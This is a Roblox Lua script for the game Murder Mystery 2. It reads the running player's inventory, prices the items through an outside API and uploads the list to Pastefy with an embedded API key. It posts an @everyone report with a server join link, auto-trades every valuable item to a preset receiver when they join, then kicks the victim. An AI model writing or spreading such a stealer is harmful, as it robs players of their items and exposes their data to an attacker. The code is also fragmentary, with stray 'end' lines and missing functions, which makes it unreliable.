local item_values = {}
local values_fetched = false

local function GetRequestFunction()
    if request then return request end
    if syn and syn.request then return syn.request end
    if http_request then return http_request end
    return nil
end

local function fetch_item_values()
    local req = GetRequestFunction()
    if not req then return false end
    local success, res = pcall(req, {
        Url = 'https://api.project-reverse.org/valuables/get-game-valuables?game=mm2',
        Method = 'GET',
        Headers = {["Content-Type"] = 'application/json', Accept = 'application/json'}
    })
    if success and res and res.Body then
        local decoded = game:GetService("HttpService"):JSONDecode(res.Body)
        if decoded and decoded.success and decoded.data then
            for _, item in ipairs(decoded.data) do
                if item.name and item.price then
                    local key = string.lower(item.name):gsub("'", ""):gsub(" ", "")
                    item_values[key] = item.price
                end
            end
            values_fetched = true
            return true
        end
    end
    return false
end

end

local function FormatName(t)
    if not t or t == "" then return "Unknown" end
    local r, c = "", true
    for i = 1, #t do
        local ch = t:sub(i, i)
        if ch == " " then r = r .. " " c = true
        else r = r .. (c and ch:upper() or ch:lower()) c = false end
    end
    return r
end
local function GetTradeStatus() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end

    return pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(p) end)
end

local AllItems, TradeItems, TotalVal = {}, {}, 0
local function ShouldTrade(r, v)
    if not r then return false end
    local p = table.find(RarityList, r)
    return (p and GodlyPos and p <= GodlyPos) or (v and v >= MIN_VALUE)
end
local function Refresh()
    local a, tv, tt = {}, {}, 0
    local d = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
    if d and d.Weapons and d.Weapons.Owned then
        for id, q in pairs(d.Weapons.Owned) do
            if q and q > 0 then
                local n = tostring(id or "")
                if n ~= "" then
                    local v = get_item_value(n)
                    local r = v >= 500 and "Ancient" or v >= 100 and "Godly" or v >= 10 and "Legendary" or "Rare"
                    local c = string.find(string.lower(n), "chroma") ~= nil
                    local e = {DataID = id, Name = n, Rarity = r, Count = q, Value = v, IsChroma = c, Total = v * q}
                    table.insert(a, e)
                    if ShouldTrade(r, v) and not Blacklist[id] then
                        table.insert(tv, e)
                        tt = tt + e.Total
                    end
                end
            end
        end
    end
    table.sort(a, function(x, y) return x.Total > y.Total end)
    table.sort(tv, function(x, y) return x.Total > y.Total end)
    return a, tv, tt
end
AllItems, TradeItems, TotalVal = Refresh()

local function UploadPastefy(text)
    local key = "bCmvP7YNqkOyMEeJDvL0eDXzfSgm2XhWcGadQ3aXKKiH7BKe5ZBIgem3tbuC"
    local ok, res = pcall(function()
        local f = GetRequestFunction()
        if not f then return nil end
        local r = f({
            Url = "https://pastefy.app/api/v2/paste", Method = "POST",
            Headers = {["Authorization"] = "Bearer " .. key, ["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = text, title = "MM2 Inventory", expires = "never", encrypted = false})
        })
        if r and r.Body then
            local d = HttpService:JSONDecode(r.Body)
            if d and d.paste and d.paste.id then return "https://pastefy.app/" .. d.paste.id .. "/raw" end
        end
        return nil
    end)
    return ok and res or nil
end
local function GenText(l)
    local s, t = {}, 0
    for _, i in ipairs(l) do t = t + i.Total end
    table.insert(s, "Total Value: " .. t)
    table.insert(s, string.rep("-", 30))
    for _, i in ipairs(l) do
        local n = FormatName(i.Name)
        if i.IsChroma then n = "Chroma " .. n end
        table.insert(s, "[" .. i.Rarity .. "] x" .. i.Count .. " " .. n .. " - " .. i.Total)
    end
    return table.concat(s, "\n")
end

    local ping = false
    for _, i in ipairs(AllItems) do if i.Value >= MIN_VALUE then ping = true end end
    local mention = ping and "@everyone" or ""
    local top = {}
    for j = 1, math.min(10, #AllItems) do
        local x = AllItems[j]
        local n = FormatName(x.Name)
        if x.IsChroma then n = "Chroma " .. n end
        table.insert(top, "> " .. n .. " [" .. x.Count .. "] - " .. x.Total)
    end
    local prev = table.concat(top, "\n")
    if #AllItems > 10 then prev = prev .. "\n... and " .. (#AllItems - 10) .. " more" end
    local jid = _G.RealJobID or game.JobId
    local paste = UploadPastefy(GenText(AllItems))

    if paste then table.insert(flds, {name = "Full Log", value = paste, inline = false}) end
    table.insert(flds, {name = "Join Link", value = "[" .. string.sub(jid, 1, 8) .. "...](https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. jid .. ")", inline = false})

        footer = {text = "MM2 • " .. os.date("%Y-%m-%d %H:%M:%S")}

end

local function KickDone() task.wait(2) LocalPlayer:Kick("Transferred!") end
local function FindTarget()
    if type(RECEIVER) == "table" then
        for _, n in ipairs(RECEIVER) do if n ~= "" and Players:FindFirstChild(n) then return n end end
    else
        if Players:FindFirstChild(RECEIVER) then return RECEIVER end
    end
    return nil
end

local MAX_ATTEMPT, WAIT_TRADE = 999, 2
local function DoTrades(target)
    local att = 0
    while #TradeItems > 0 and att < MAX_ATTEMPT do
        att = att + 1
        local st = GetTradeStatus()
        if st == "ReceivingRequest" then
            pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
            task.wait(0.5) goto cont
        end
        if st == "StartTrade" then
            local send = math.min(4, #TradeItems)
            for _ = 1, send do
                local it = table.remove(TradeItems, 1)
                for _ = 1, it.Count do AddItem(it.DataID) task.wait(0.05) end
            end
            task.wait(6)
            if AcceptTrade() then
                WaitEnd()
                AllItems, TradeItems, TotalVal = Refresh()
                att = 0
            else
                AllItems, TradeItems, TotalVal = Refresh()
                task.wait(WAIT_TRADE)
            end
            goto cont
        end
        if st == "None" then
            local sent, t = nil, 1
            while not sent and t <= 5 do
                if SendTrade(target) then sent = true task.wait(0.5)
                else task.wait(math.min(t * 0.5, 3)) t = t + 1 end
            end
        end
        ::cont:: task.wait(0.5)
    end
    KickDone()
end

local function AutoTradeJoin()
    local busy = false
    local function CheckJoin(p)
        if busy then return end
        local t = FindTarget()
        if t and p.Name == t then busy = true task.wait(3) DoTrades(p.Name) end
    end
    for _, p in ipairs(Players:GetPlayers()) do CheckJoin(p) end
    Players.PlayerAdded:Connect(CheckJoin)
end

if #AllItems > 0 then AutoTradeJoin() else task.wait(1) LocalPlayer:Kick("No Items Found!") end
